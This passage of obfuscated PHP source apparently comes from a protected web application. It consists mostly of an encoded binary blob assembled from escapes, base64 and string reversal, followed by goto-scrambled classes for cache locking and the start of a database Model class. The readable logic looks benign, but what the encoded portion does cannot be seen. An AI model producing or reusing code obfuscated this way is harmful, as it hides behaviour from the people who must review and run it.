UJp')."\xa4\x28\xae\xfd\xd2\xe4\x16\xf3\xa0\x85\x36\xb6\xb2\xce\x89\x34\x33\x75\x76\x86\x10\x46\x62\xac\x1a\x53\xcb\x5\x4b\x8a\xca\xa\x9a\xa4\x88\x6a\x90\x6a\xf5\x2c\xc6\xa9\x13\x6c\x9d"."\x33\x35\xad\x45\xce\xf\x46\xb4\x5\xaa\x42\xd0\xd4\x1b\xec\x68\xd\x4\xa9\x5b\xf\xea\xf3\x87\x90\x2c\xf2\xda\x3\xc4\x1d\xdd\x45\x23\x26\xd\xe8\x32\x69\xb9\x83\x1e\x69\xf0\x1a"."\x49\x70\x0\x77\x82\x88\x3\x68\x31\x39\x4e\x7a\x42\xd\xcd\x80\x19\x8d\x35\xfa\x1\xf\xee\x5b\x18\xe1\x15\x34\x83\xa2\x80\xbd\x6d\xa1\xc6\xed\x80\x8a\x42\x72\x15\xd0\xd2\x6c\x9b"."\x2\x72\x44\x9c\x3a\x58\xb6\xaa\x3f\x48\xca\xba\x14\xa8\x6b\x8d\x35\x70\xa1\x6e\x3c\x2b\x88\xdd\x17\xfc\xf7\x42\xed\x82\x63\xa4\x61\x76\x61\xd9\x72\xd\x24\x23\x6b\x50\x47\xa2\xc3".base64_decode('f28wpHCGGhRDqu3/tRB30YVaQoUECmUrg1AFqwqTVc2QZG6NDsgikBSawekZ')."\14\165\222\341\33\21\13\245\203\217\121\152\302\215\14\144\10\57\60\13\335\65\72\321\344\20\376\142\51\40\157\54\104\237\250\360\61\40\132\155\21\177\11\374\26".base64_decode('3oN/OnNJJ+g8eYxKKiazU4d7yiNY0QsGRzlGjvoFHzJynwK12SkLXtIFMgl8')."\200\164\132\230\235\70\74\214\271\223\220\371\101\157\54\34\154\17\321\33\73\30\107\106\113\41\137\103\47\273\110\143\320\106\317\2\73\4\142\174\304\323\124\26\314"."\244\45\10\107\374\110\54\24\204\102\243\57\320\150\53\20\156\146\356\174\254\260\130\300\337\72\277\154\102\44\30\153\21\212\140\240\77\342\153\261\303\254\65\204\175".base64_decode('cLfyeH0g2CAk+4OlMwGYIBsQy54YCJjo6FLEedQCBiS5DLKtzhjgeudGl1dX')."\105\335\163\135\343\231\320\205\251\207\140\157\63\14\330\240\124\36\236\7\24\367\160\56\22\163\273\134\244\116\26\0\122\40\363\205\100\151\44\161\231\26\306\126\343".strrev('-²…rQÌM¯ğf[+‡ÄÙÂtér¼Æ.M˜gp±ä×Çä0÷eÍtÔ¢ömF–')."\370\150\61\122\22\101\56\125\343\250\317\167\155\122\113\24\241\141\72\237\140\176\206\0\220\213\237\237\164\233\261\353\0\162\202\70\105\347\162\160\116\105\126\40\31".strrev('~§ œœ‚ªO–„š¯‚ê¨:Ä]•tHÑ“9ÌéŞšú$àphp¹ge·').base64_decode('MdFDzXUQzTKc/SqdgrHMrJ28wsZk5MEhJj7C9zoNNZ13ytm0BjiATI5C5R5L')."\72\367\233\124\320\262\52\165\137\321\353\4\115\10\151\70\63\250\234\322\172\370\300\303\134\114\301\210\301\142\42\136\40\112\110\71\123\156\36\53\260\67\141\324\345".base64_decode('WmkK8ebWCBgvwaaD+ufihpHw6EYOzHDUIXHfkFSULM9XQLFFMFKhFCHXw1+k')."\163\75\354\351\51\141\71\45\341\201\324\50\74\134\363\203\220\70\142\4\151\365\203\364\135\230\230\224\324\17\302\223\254\204\371\202\126\212\242\57\113\117\107\170\212"."\xb3\xb9\xc5\xd3\xe0\x4\x74\x6d\x12\x55\xc0\x2\xa7\x4b\x34\x2\x8e\x17\x8a\x39\x72\xbf\x31\x85\xb2\xb8\x18\x32\x61\x9a\x94\x1\x53\x4d\x50\xa2\xd4\x81\xd4\x58\xab\xc7\x34\xc\xc4"."\376\217\200\220\225\204\117\202\164\21\60\324\206\52\30\310\331\161\34\307\176\65\350\73\166\106\146\35\206\303\300\241\162\355\56\54\333\356\302\162\355\56\264\265\273"."\xb0\xb4\x5d\xc\xb2\xa1\xa4\x5c\x28\x34\x60\xf\x8d\x22\xed\xb0\x80\x12\x62\x84\xd2\xd7\x14\x7c\xaa\x14\x1f\x4e\x89\x38\x89\x75\x67\x5c\x20\xd9\x8b\xb9\xbb\x24\xcb\x6f\xf0\x10\x43"."\373\224\260\41\54\325\271\10\41\112\122\162\156\120\162\236\225\15\23\62\271\377\7\67\147\320\36\272\205\161\336\324\141\221\314\121\270\230\347\244\310\37\164\153\206"."\xe1\x86\xae\x5e\x10\x4b\xc9\x5e\xee\x83\x61\x7a\xc5\x66\x1d\x2b\x7e\x4b\x15\x4\x40\xe2\x77\x82\x79\xe2\x62\x7e\xba\xb8\x33\x2f\x7c\x33\x82\xc3\x3e\x66\x8\xd\x38\x63\x4f\x5a\x9".base64_decode('K5DAkdnyDRQ0QxHdyCUV5HqIWboJTthy8gAkQVShQXDHRj2ViX5f4EQ6cxY/')."\220\3\116\60\164\233\373\62\103\121\172\250\254\43\160\311\114\76\155\143\156\311\354\303\121\55\46\350\234\56\352\334\173\35\272\103\167\226\5\70\5\53\122\114\57"."\x4\xbf\x86\xa0\x87\xa4\x11\xd8\x61\xb2\xc3\x33\x68\x96\xa8\x74\x8b\x7f\x16\x95\x1b\xbf\x53\xe7\x3e\xe4\xc0\xaa\x62\x8f\xa3\xf3\x95\x41\xea\x8d\xcd\xb6\x47\x6c\xe\xdc\xa2\x4d\xd1"."\x96\x68\x44\x9c\x30\x53\x97\x53\x29\xd0\x6d\xc1\x27\x94\xa5\x2f\xbf\xe4\x62\x8e\x5c\xf\x9d\x58\xd6\xa9\x1c\x49\x44\xc\xb0\x5b\x47\xca\x3\x8e\xfe\x18\xc3\x53\xe4\x63\xb8\xc\xa6".strrev('–ú9$µëäôÀğ.dæ¸qäÙìY¥'."\0".'¦kOØ‹]œP ã\\SWá').strrev('ÎÇ"	—ñ\\\\éQõ9‰ª'."\n".'¶;QQú€R¸qBq+«~[­¨«¼'."\0".'V')."\225\115\123\270\110\233\213\146\3\122\200\111\356\111\356\176\102\25\346\366\302\26\271\157\135\373\111\60\20\3\304\217\52\101\304\104\22\114\210\73\231\165\61\245\231".strrev('r3ÎTg:4l«®fº‰Jš®‰Êº„D¬¹¹ìÜéÜœ‹-=KJTïç„õ')."\166\3\272\141\67\225\26\170\105\16\35\372\141\171\164\16\271\7\233\15\67\23\213\270\255\261\341\312\22\232\224\223\207\264\74\70\360\0\75\312\271\22\144\62\333"."\x19\xcd\xe2\x7e\x0\xf3\x8a\xd9\xaf\xe9\xe4\xf9\x80\x90\xd9\x49\x35\x53\x44\xbc\x25\x28\x62\x90\x3d\x86\xad\xbc\x6b\xe1\xc5\x18\x1d\x7e\x7b\x61\xb0\x98\x77\x42\xa9\xd8\x19\x16\x3d"."\256\330\34\216\326\130\363\103\271\326\232\137\44\204\11\116\42\162\74\210\35\304\326\112\242\327\140\301\313\232\23\162\6\170\347\321\313\24\2\203\64\222\202\124\321".base64_decode('Zx3Fa0gAY1YCOM/WXzjVTsBtQfwHmwocwqZSLovVNa3dYa19FlARuLhO0RPu')."\x0\x60\xac\x61\x32\x74\xa5\xe9\x84\xeb\xeb\x54\x93\xc3\xa5\xf0\x4d\x5d\xb6\xab\x9\x82\x2a\xe5\xb2\xb4\x17\xd5\xa4\xbd\x49\xf4\x62\xe3\x2c\x16\x69\x83\x65\x2b\x15\xd9\x7e\x9a\x1".base64_decode('DcLP6rMw4EA+dzKe287DCxeWpc4oweaVJk2unToT/CXkkT44FQtmHQtSZ5Un')."\xb8\x53\x94\xe\x70\x3f\xb6\x74\x6c\x70\xc1\x2d\x1e\x3a\x5\x30\x9f\x46\xb6\xc3\x29\x1\xb1\xe4\xe3\xbd\xb5\x78\x41\x16\x19\x89\x30\xab\x8a\x78\x25\x13\xfc\x94\xa2\x9b\x56\xbc\xb3"."\340\213\154\214\271\171\55\103\131\223\112\37\75\75\311\341\51\360\46\154\201\322\64\240\263\374\62\337\62\361\154\17\37\131\34\252\336\21\214\357\1\35\327\70\363"."\205\216\131\341\132\63\221\51\346\173\352\204\104\311\324\64\51\47\347\7\211\130\60\316\250\35\147\314\202\15\325\215\163\115\111\31\40\102\350\67\163\337\5\317\25"."\xee\x7b\x7\x5b\xed\x93\x14\x7c\xaf\xec\x82\xde\x94\x5d\xf0\xd0\xa\x15\x49\xae\xb6\x6c\x91\xf9\xcf\x2d\xa0\x30\xe9\x61\x5b\xa0\xbd\xc9\xdf\x2a\x3c\x22\xb\x80\x58\x83\xb7\x35\xe6"."\x69\x6b\x2b\x9b\xc0\xd8\x15\x78\xa3\x5\xdf\x5b\x5c\xdd\xd4\x59\x7c\x82\x62\xd9\x6c\x35\x97\x96\x12\x50\x75\xb4\xae\x2\x42\x2b\x24\x43\x4f\x50\x27\x66\x15\x6e\x42\x57\x51\x6\x2e"."\110\315\126\111\221\112\130\104\112\1\264\161\242\20\116\256\234\63\333\255\316\141\223\315\35\22\350\32\327\200\165\271\307\100\261\312\15\337\147\363\47\302\325\25\337".base64_decode('iBC0kbsfkKTZsoTnsa4SPp6lKqUMOJ+ZBsoce+FW+lAx2y2LiXCnhTTK8zLR').base64_decode('qo/dGJe9CvckbJ5wG+T8gtIisHJXolySG8n6bsELM3GBIqoLWrwDWd8J2NV6')."\31\4\161\61\337\363\5\71\321\3\261\213\37\15\70\243\213\44\264\101\41\6\47\130\174\271\232\302\213\30\30\2\150\24\12\261\72\367\115\275\164\51\256\10\162".strrev('˜¸qáXñ6´	æ„8™‹0fÖqœ9Ã”vEˆ íPSÉ=NˆÂ——Ë')."\xaa\xab\xa1\x58\x74\x71\xa5\x6b\xfc\xf2\xe5\x6e\x95\x3e\x42\x47\x2b\xac\x65\x5d\x2c\x37\x8e\x47\x5d\xd6\xfc\xa0\xe7\x64\xaa\x59\x46\x2\xb0\xe7\xc4\xbc\xe4\x49\x64\xe3\x8d\x74\x8f"."\347\232\365\354\261\131\202\57\320\165\165\163\26\263\307\205\56\232\106\31\102\165\342\14\272\334\103\31\147\244\203\5\33\132\71\313\313\20\34\323\22\27\272\270\366"."\130\35\270\315\355\143\256\223\361\54\212\141\117\241\40\106\351\207\154\320\145\170\126\215\273\331\116\307\27\344\256\4\127\113\247\131\20\235\261\301\341\113\261\55\1"."\52\13\43\160\37\40\204\200\3\353\266\303\101\135\14\310\2\263\215\204\256\26\114\13\215\302\237\106\251\100\316\256\273\345\76\31\147\251\220\350\67\27\52\220\153"."\xcf\xa\x40\x93\x70\xa\x21\x6\xbc\x2b\xb3\x21\xf1\x91\x74\x25\x5b\x57\x81\xba\x6b\x64\x14\x5\x94\x47\xe4\xa5\x5c\x23\xa0\x60\x85\x44\x29\x63\x4e\x66\x33\xa6\x9b\x1a\x38\xf4\x98".base64_decode('NjbxL98eIoqmnlby5EDYqzGn4N+xYyiioA8aZBUda9MhioOem1L8You4u28L').strrev('ádvEÙöyó¯Ë!nqƒšÓ¯¾yÓT<ËŸÓXËÊØ'."\r".'Ü¼8êÁ#').strrev('RÜ'."\r".'–İX7àJeàEQs'."\n".'—¤’‘-Ğ@Ç€ƒ³@ŒşzÃòh¦pœ\'')."\x56\xa3\x9e\x91\x26\xd5\xd4\xd4\x38\x6b\x26\x82\xbf\xec\x49\x91\x34\x51\x4b\xed\xe6\x84\x2c\x35\x35\xb5\xe8\x2f\x4e\x40\x97\xae\x64\x42\xad\x29\x60\xff\x52\x42\x43\x32\xf4\x2b\xa"."\351\20\41\363\71\65\137\244\334\121\3\124\136\227\140\317\352\352\352\50\7\100\7\0\46\23\131\15\325\122\52\60\113\220\352\146\111\350\51\213\304\24\373\64\260".base64_decode('N0KyPvSkgNuehgFbAtYKTQudZqq5ALJxLAD98OWTRP6YhU1O6sTGXHR6RaD4')."\262\144\151\25\344\3\207\145\202\165\30\2\204\233\12\144\54\305\154\12\120\54\313\114\334\140\264\225\145\305\176\203\261\146\77\31\155\31\104\312\150\375\61\176\310"."\xc1\xe8\x49\x2c\x86\x6\xf\xe5\x14\x8a\x32\x6c\x98\x64\x6\x28\xf9\xa3\x28\x42\x5f\x9d\xc9\x23\x36\x32\x1a\xeb\x51\xb3\x16\x8b\xa2\x98\x50\xb7\xe8\xf4\x16\x50\x19\xc8\xbd\xd2\xf5"."\303\327\350\244\1\310\370\270\370\322\43\257\200\350\253\53\130\257\245\166\244\60\171\272\306\155\174\112\76\121\104\143\202\275\31\275\144\16\377\27\305\11\12\361\121".base64_decode('AFY1aGDukIQK7Em2Mp6k8PUcg/tBamAuz0TnSPjBVnjAN4hPTv5CS+voEyQE').base64_decode('V0HX0mDKDXGsAN5WHsyyl+Ysk4kNSMwnAqF2EP2QC8EeblMk809MCVm5yCMA')."\255\372\73\102\102\3\363\51\56\2\241\304\41\276\311\43\263\103\153\35\120\224\261\102\130\317\176\1\127\250\110\152\222\217\376\10\366\140\44\33\127\127\202\327\5"."\342\25\246\252\321\347\176\70\33\374\35\316\12\57\301\62\262\25\50\345\303\173\305\232\366\341\271\253\150\340\62\232\13\16\236\335\114\211\27\264\160\340\61\121\352"."\206\333\245\231\175\240\246\14\272\130\121\242\144\355\321\365\55\254\240\226\321\7\41\6\104\14\312\211\44\151\177\173\213\12\345\236\4\142\42\231\234\224\300\76\101".base64_decode('ZdiMrpmmaDHqSQoUMCCenRFcxDmHt2N55xF8DbKsgGjT1mVKrZGejAu5QuXM')."\275\55\152\327\245\101\324\331\244\364\227\72\151\314\63\137\362\160\71\303\202\272\103\231\26\110\41\126\204\34\32\272\222\0\322\14\44\174\202\45\142\336\14\51\151".base64_decode('MRrQmKQL3w+UMlVA+2MBOSEWABmsKNo2Cz4eQUxwzCmc5M6JEmMBYrhmHJkg').base64_decode('JKD85bgB2/2LoL2IRMxwMc6uum0nNNWNlMRTkmo4wgqQbS4cgSGmgWqhVzk+').strrev('ç)uP¨0’$Ÿ\'[CÉx=Ñ˜I(SL¥>©À— S…W\'ƒN¤³j±2')."\xc4\x49\xce\xc9\xe4\x96\x55\xd4\x92\x24\x47\x23\xf5\x73\x1\xf6\x82\x80\x6\x90\xdb\xa5\x14\x8c\x68\x44\x91\x7c\x3c\x8f\x26\x7c\xaf\x6\xd9\xc5\x72\x23\x45\x64\xe8\xcb\xd6\x13\x59"."\x4\xb3\x98\x2e\x9c\x38\xa\xd3\x96\x42\xd6\xb5\x22\x59\xe1\x8f\xbd\x58\x89\xa\x66\x68\x2f\x97\x8e\x67\x8\x26\x7b\x2d\xda\x64\xb6\xc\x60\x67\x58\xd3\x89\xb3\xce\x9c\xe5\xc3\x83".base64_decode('AA8sWgu2SoibVtEhKSrFx8EV8wBIwy5BhYnhj9bYnJhqFDK6xMERjQFLH75d').base64_decode('TKOS2I2QD8NUVUO7EctdQssg0/8HK9kDz0em7GaIEZrKkNOwRLCmiKU0A7Fc')."\375\12\61\1\141\62\160\133\163\233\233\201\352\351\64\61\113\116\42\100\361\117\215\20\225\51\142\203\321\17\346\135\243\116\54\32\152\231\362\14\165\177\323\237\123"."\23\122\40\330\344\157\360\4\274\376\360\174\51\255\230\302\127\70\221\22\264\165\273\243\53\41\274\70\24\363\343\314\7\55\14\72\343\200\55\164\46\31\73\154\160"."\306\127\320\251\21\34\262\133\253\305\70\252\350\45\65\2\66\72\147\45\10\250\14\274\350\52\223\73\313\357\172\204\314\5\135\51\315\77\250\240\257\21\362\36\13"."\x5\x8a\x65\x7a\x43\xf2\x97\x6f\x1\x6c\x11\x6b\x6e\x70\x58\x2b\xf9\xe1\x3a\xaf\xe6\xfb\x54\x43\xe5\xc4\x81\x96\x18\x14\x6b\xe7\x57\x79\x3a\xf3\x9c\x2c\x4c\x7a\x52\x74\x8e\xcc\x27".base64_decode('G7ciWvvbZU8xh6gqiZdJdPRRoBfT5Asb3G01igoOxQu6rBqKAMCercdX05jg')."\x14\x84\x94\x8e\xe1\x32\x18\x16\x82\x5f\xe7\xfb\x5f\x57\xae\x26\xb9\x83\xf\x5b\xd7\xd4\x24\x7d\xde\x66\x9a\xee\xd8\x7d\x6c\x83\xf8\x91\x10\xda\x85\x12\xaf\xe7\xff\xd5\x7f\xba\x43"."\xb0\xf9\x46\x56\xed\x54\xff\x10\x7d\xa2\x94\x3c\x3c\xb0\x47\xdd\x18\x36\xef\xc6\x51\xb7\x5d\x47\x11\x79\x6c\xcd\x27\xf4\xc1\x82\xf8\x5a\xe2\x4e\xd2\xef\xd3\x50\xc9\xd\xfa\x2b\xf1".strrev('YÌ«·Š9´;yb«"S?’‹®Œ 4|â€X7°cI…ä˜­Y%¡î¾Q«Ñ').base64_decode('vthX0gb0wDt8PaCcxKV4lkGqk2rQTRFXjpJmU5sc3gTy2eDLFUyLjEZUZzEI').base64_decode('8SJcjoGaF1pusARgEfADtBtMRws6Js6nNHHUiByCUwV/pgKqKuMQFgIdgC1X')."\314\122\347\350\270\236\141\53\65\354\7\12\147\156\0\211\10\147\264\176\353\147\54\40\104\140\145\54\44\332\332\26\114\21\120\33\31\142\12\146\55\364\27\336\327".strrev('Ï³ÂÜF"3Î\\ğR¡—.Z'."\0".',>X7RÙªWIË¼j½¾iKòQ?ÃµÒ¼[')."\x55\xf0\xcd\x46\xd3\x4\xc\x42\x1f\x46\xf0\xe\x53\xd4\x6\x96\xac\x7e\xaa\xb9\xfb\x6f\x7e\x1e\x59\x5d\x36\xb3\x87\x2e\xa6\x2c\x85\x94\xd6\x44\x7\xdc\x11\x2d\x22\xa7\x1d\x98\x13"."\202\364\210\307\352\7\305\260\250\15\210\6\15\22\351\15\111\222\141\300\34\41\3\375\262\104\322\201\76\173\200\251\222\375\323\32\302\166\141\244\116\54\235\316\152"."\x71\x39\x1b\xc2\xda\x34\x16\x2d\x75\x1d\x48\x31\x4c\x87\xce\x92\x8d\x10\x2a\xb9\x50\x18\xf6\x32\x9e\x70\x27\xf8\x62\xbe\x98\xf7\x63\x3b\x27\xb\x54\x17\xa4\x24\x51\x1f\x13\x3f\x41"."\160\23\17\222\35\264\326\206\337\34\310\260\305\52\351\273\17\372\201\162\124\243\360\231\72\167\351\73\21\324\366\241\314\216\240\56\107\236\357\134\242\30\103\62\110".base64_decode('syW+wJYNChEC7noUQLteZHt/Acrw0PrxFYyw6MerpJgMAONcQhQNPflbsf2D')."\17\264\31\366\365\12\7\36\31\377\200\20\376\126\205\203\175\227\302\201\77\111\341\40\137\243\160\160\123\235\137\372\176\13\377\372\224\365\223\125\260\317\114\217\254"._kodDe('KQ556Kxh1mGfN/p+612A7JrxXyFqwVT85gU+v6YaGgv4TTuoyekD3StzlWFCyA==')."\301\107\45\256\114\231\71\374\357\165\140\165\102\44\154\44\255\124\247\166\166\134\247\357\55\366\154\252\5\353\200\210\317\265\332\261\237\247\22\47\370\235\271\344\244"."\311\123\147\212\102\75\137\37\376\216\101\234\344\21\177\133\344\61\205\34\340\174\341\45\53\132\111\324\307\224\270\175\121\242\125\21\264\364\353\61\2\212\132\111\362"."\xff\x6e\x2b\x70\x16\x19\x67\x15\x14\x31\x4b\x3f\x8d\x55\x32\x25\x8\x2b\x5\x25\x5\xe1\x40\xb3\xbd\x42\x6b\xf0\x71\xd8\xe0\x9d\xc5\x47\x18\xff\x7a\x8c\xb5\x2d\xfc\xad\xa3\x32\xe3"."\20\16\42\276\65\360\207\111\264\54\24\66\163\360\252\323\324\145\253\324\124\116\70\100\63\101\45\21\25\175\133\115\261\367\35\115\14\271\126\340\311\202\364\40\326"."\x68\x6a\xf6\x3b\x11\x58\x1c\x1e\x54\xe8\x4a\x2e\x98\xcf\x92\x63\x17\xda\x24\xf2\x4d\xf6\x7f\x5b\x40\x2a\x20\x60\x19\x83\xeb\x23\x94\x19\xb9\x7b\x1e\x25\x24\xb6\xf\xbb\xd8\xbe\xcc"."\xf5\xb\xfd\xc6\x4c\x17\x13\x86\x9c\x32\xfd\x58\xc\x5a\x54\xe1\x1e\x4d\x31\x83\x68\x81\x9\xf7\xc2\x65\x33\xeb\x58\x6d\xd5\x83\x62\xbc\x8e\x2e\x87\x34\x5c\xa6\x52\x2e\x4c\xf8\x90"."\15\167\322\40\260\134\260\64\65\207\32\106\264\245\324\212\177\234\3\131\270\360\253\151\264\127\55\373\126\360\341\46\32\214\240\212\304\155\120\132\65\272\55\41\375"."\45\33\27\175\353\34\51\156\170\232\230\131\220\54\250\213\300\251\23\76\316\244\211\141\253\205\155\220\172\343\2\114\222\105\354\2\161\257\355\373\135\210\370\330\77"."\352\105\307\217\366\71\247\151\202\175\231\205\373\147\137\261\260\110\3\206\375\163\56\200\235\22\135\327\201\50\303\160\162\170\22\252\207\64\163\161\153\16\373\47\335".base64_decode('CoIxre27j8LFpfWLjhmxW9CdgG1bUwM/aC+JX1MI4Ue+znCYcuL/z594+//5')."\x65\x37\xa6\x1c\xde\x44\xd8\x5a\xca\x83\xd\x9\x1e\x38\xf1\xa5\xa6\xad\xf7\xd6\x83\x71\x7f\x31\x95\xe0\xa5\xc3\x12\x23\x11\xbe\xcd\xe0\x89\xe3\xb2\x7d\xd2\xd2\xc5\x14\x14\xa9\xd3"."\x9\xea\x8b\x42\xa6\x8f\x26\x32\xfc\x8c\x4d\xc9\x25\x25\xfd\xfc\x13\xc0\xc3\x1e\xf6\x75\xa2\x72\x91\xd2\x6f\xf3\x59\x50\x8e\x72\x99\xbc\x9b\x79\x35\xd1\x53\xe6\x11\xe\x4e\x7c\xc0"."\352\364\117\340\15\112\262\161\252\4\130\10\352\146\303\115\103\11\50\134\101\6\222\22\103\321\210\54\130\240\142\130\65\241\277\135\363\50\321\100\226\250\204\166\210"."\xf4\xc2\x2\x2a\xa1\x32\x11\xcb\xd9\x67\x1\x8a\xd3\xc3\xbf\x41\xe9\xb2\x7e\x52\x91\x94\x68\xb1\x7d\x7c\x7\x67\xb2\x78\x84\xb4\xdc\x28\x97\xbe\xc9\x96\x96\x66\x5b\x58\x2c\x2\x15"."\64\255\367\62\354\73\176\65\366\17\373\115\164\226\66\206\365\245\341\55\102\10\312\371\24\41\321\243\3\172\24\54\123\6\157\306\60\317\63\14\372\227\337\172\354"."\53\214\202\370\13\102\342\170\351\26\156\323\65\304\200\131\241\354\56\103\320\207\23\76\52\127\362\241\53\333\345\75\20\212\370\153\226\252\41\347\235\144\330\341\366"."\226\52\244\362\117\60\25\360\364\302\307\133\315\134\1\337\170\221\116\143\233\32\313\375\222\41\372\343\265\232\336\10\272\253\326\4\250\174\154\335\51\163\312\145\113".base64_decode('aLohZGPwcnnht8RMy2xyj6p2T6pIAMYyrUW0JU+HIkh4WQNMbdKqFYkSEZi6')."\156\242\137\364\345\157\103\326\247\71\346\326\262\204\122\25\325\200\220\214\112\121\347\37\340\27\132\30\371\271\235\65\112\306\67\332\236\76\331\244\17\134\366\122\355"."\26\11\102\170\310\113\40\334\361\225\276\325\360\47\44\341\310\247\305\240\10\302\151\255\15\56\20\177\116\355\344\76\376\74\303\171\336\144\222\175\36\322\222\225\175".base64_decode('Hp5BAYR/SRJyOIIxI9eGVfrtXyxziQaQloylUG7saB8X2gsMTl7J8oJqAcEW')."\16\302\136\163\231\326\211\40\70\100\165\155\256\216\202\373\310\304\142\336\244\325\46\223\145\143\213\1\362\40\145\171\247\5\152\23\205\340\45\3\75\237\155\111\206"."\370\111\113\353\303\233\50\247\13\153\253\144\3\102\165\342\243\334\260\5\302\345\33\341\350\146\235\142\301\176\225\47\320\123\110\263\114\276\100\305\330\300\110\316\220"."\x98\x68\xe9\x8e\x7d\x69\x11\x17\xcf\xf1\x12\x3\x73\xe8\x1e\xd3\x45\xef\x85\x4b\xf3\x2b\xb6\xde\x8b\x5\xec\x23\xc3\x25\x8c\x7e\xd5\x4c\x64\x4a\xe1\x7a\xc9\xbc\x91\xba\xca\x77\xc9"."\xde\x30\x9d\x36\xbb\x4c\xc5\x2b\x11\xa4\x99\x92\xc7\xfb\x88\x56\xa6\xc\xee\x51\xd9\x62\x38\x9\x7d\x5b\x99\xf1\x7f\x96\xb2\x78\x94\x65\xcb\xe2\x24\x58\xb6\x24\x99\x16\x16\x2e\x23"."\204\162\246\134\64\206\31\136\351\344\21\271\74\131\146\300\66\351\25\147\35\156\76\313\146\56\155\216\40\225\75\67\22\344\313\367\202\313\337\266\7\322\162\275\50"."\233\171\330\136\224\371\136\54\361\141\125\206\116\322\224\62\224\221\277\246\227\322\140\236\126\346\155\37\327\11\317\127\321\221\112\231\144\121\121\240\274\52\101\250\354"."\356\66\254\157\374\66\270\70\61\134\105\210\50\15\365\344\251\241\5\50\316\325\256\240\126\45\373\220\50\253\217\162\127\66\35\125\212\173\371\242\240\56\131\126\311"."\325\201\76\63\135\42\134\146\145\172\171\55\350\7\143\221\102\63\325\204\240\110\144\377\260\66\116\247\215\144\205\73\61\333\165\24\27\300\55\17\310\145\56\154\20"."\210\360\122\374\36\330\242\70\215\17\147\162\1\216\337\301\32\340\243\50\173\373\200\262\217\3\237\171\70\31\176\351\333\1\323\42\132\1\375\326\153\246\111\111\5"."\x10\xc9\x51\x4e\xc4\x81\xc1\x83\xcb\x21\x28\x11\x80\x10\x7f\xe8\x80\xb3\x88\xee\xde\x11\xbe\x21\xba\x80\x82\xe4\x45\xe\x4a\x83\x61\x5\xa7\x22\x6a\x62\x89\xc0\x3b\x7d\x16\x11\xcf"."\45\362\214\326\130\264\275\5\162\0\220\360\342\332\0\165\100\6\215\63\171\177\370\367\107\145\73\227\305\237\362\11\276\211\52\21\310\4\326\160\343\24\67\361\342".base64_decode('6kR1OIn3j+5C2lIc+7NnqoC/VAO5LuRVYO+O6KYH+jn1LfSHI+GSpDZPONwR')."\xc\x79\xb1\x33\xc8\x92\x64\x54\x4a\xd0\x3e\x29\x49\x6a\x6b\xe\xb6\xe\x97\xe6\x6b\xf1\xf8\x3\x25\x69\x50\x1b\xa5\x35\xc6\x7d\xd6\xe0\x24\x7f\x1b\xea\xa5\x27\x10\x8\x76\xc\xd7".base64_decode('C3/DfN4T9NrJ76MLGY1eLtNr+7CcpYKuYMel5LjzIl7GKr+L62pQL14sYHWZ')."\x6e\x53\xc\xa3\x8\x4b\x2a\x82\x9a\x24\xad\xa4\xee\x50\x81\x40\xa1\x73\x4c\xb6\xb9\x19\x27\x8b\x6\xa4\xd9\x14\xd6\xf1\x7b\xae\xcb\xf2\x8\x2c\xc0\xd1\x66\x11\xbe\x64\x8f\x59\x7d".base64_decode('4fhEgPFlZ0y80iy9YkepfEZgT0/SiO5StxYXrtCxYEEMqsgcC+pDOEyS/wcb')."\12\50\17\366\232\0\0"."".base64_decode(''), 10, -8))); goto A–è‘¥ªÏ¯; B¸Œİ“ë: class CacheLockRedis { public function lock($cßæ’ò²İ«, $b©Áª†Í‡ = 10) { $bÖ†ßÑŒò = Cache::init(); $föéÇëºŞ  = microtime(!0) + $b©Áª†Í‡; while (microtime(!0) < $föéÇëºŞ ) { $Fè‹»íË„ø = $bÖ†ßÑŒò->get($cßæ’ò²İ«); if (!$Fè‹»íË„ø) { $dËÈ®ƒµä§ = $bÖ†ßÑŒò->setLock($cßæ’ò²İ«, $föéÇëºŞ , $b©Áª†Í‡); if ($dËÈ®ƒµä§) { return !0; } } else { if ($Fè‹»íË„ø < microtime(!0)) { $bÖ†ßÑŒò->set($cßæ’ò²İ«, $föéÇëºŞ , $b©Áª†Í‡ * 2); if ($bÖ†ßÑŒò->get($cßæ’ò²İ«) === $Fè‹»íË„ø) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($E–‘Åô©‚) { return Cache::init()->get($E–‘Åô©‚); } public function unlock($f¥ìÆŒ­Ëé) { return Cache::init()->remove($f¥ìÆŒ­Ëé); } } class CacheLockMemcached { public function lock($D›×ÃöÛˆ¾, $C»Ïø¦‡ë = 0) { $dÂ¥ù×Ó÷ƒ = Cache::init(); $cÊ²©ßà Ë = microtime(!0) + $C»Ïø¦‡ë; while (microtime(!0) < $cÊ²©ßà Ë) { $fØ–ÜÇ§©Í = $dÂ¥ù×Ó÷ƒ->get($D›×ÃöÛˆ¾); if (!$fØ–ÜÇ§©Í || $fØ–ÜÇ§©Í < microtime(!0)) { $D«¯è¯É¹¯ = $dÂ¥ù×Ó÷ƒ->handle->add($D›×ÃöÛˆ¾, $cÊ²©ßà Ë, $C»Ïø¦‡ë); if ($D«¯è¯É¹¯) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($BÛœ™Ëáº“) { return Cache::init()->get($BÛœ™Ëáº“); } public function unlock($e’Ò¿©ö¤ã) { return Cache::init()->remove($e’Ò¿©ö¤ã); } } class CacheLockDatabase { public function lock($Fµ÷ƒ“à¨‹, $a˜³ÓÈçÜ = 0) { $D·àÕ½³”Š = Model($_SERVER[Â€Á›¨õ][771]); $F¹ø¥ ÙÀæ = microtime(!0) + $a˜³ÓÈçÜ; while (microtime(!0) < $F¹ø¥ ÙÀæ) { $BöŠÂÉ‚†Î = $D·àÕ½³”Š->get($Fµ÷ƒ“à¨‹); if (!$BöŠÂÉ‚†Î || $BöŠÂÉ‚†Î < microtime(!0)) { $cÍÉÀ’ë¹Ö = $D·àÕ½³”Š->set($Fµ÷ƒ“à¨‹, $F¹ø¥ ÙÀæ); if ($cÍÉÀ’ë¹Ö) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($F—í‰¦¶Ş‚) { return Model($_SERVER[Â€Á›¨õ][771])->get($F—í‰¦¶Ş‚); } public function unlock($AÚ¥§Ô¸‚) { Model($_SERVER[Â€Á›¨õ][771])->remove($AÚ¥§Ô¸‚); } } goto Cñ»Õï£÷; Eù¨‡Òî›Ï: define($_SERVER[Â€Á›¨õ][238], 0); define($_SERVER[Â€Á›¨õ][239], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields 